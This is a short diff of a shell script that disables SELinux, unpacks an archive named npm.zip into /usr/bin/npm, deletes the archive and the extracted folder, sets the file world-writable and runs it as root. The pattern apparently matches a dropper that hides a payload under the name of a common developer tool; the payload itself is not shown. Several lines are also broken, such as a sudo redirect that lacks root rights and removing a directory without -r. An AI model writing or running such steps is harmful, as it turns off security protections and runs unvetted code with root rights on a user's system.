@@ -1,7 +1,7 @@
 sudo echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
-unzip -d ./npm.zip
-cp -r npm /usr/npm
+unzip npm.zip
+cp -r npm /usr/bin/npm
 rm npm.zip
 rm npm
-chmod 777 /usr/npm/npm
-sudo sh /usr/npm/npm
+chmod 777 /usr/bin/npm/npm
+sudo sh /usr/bin/npm/npm
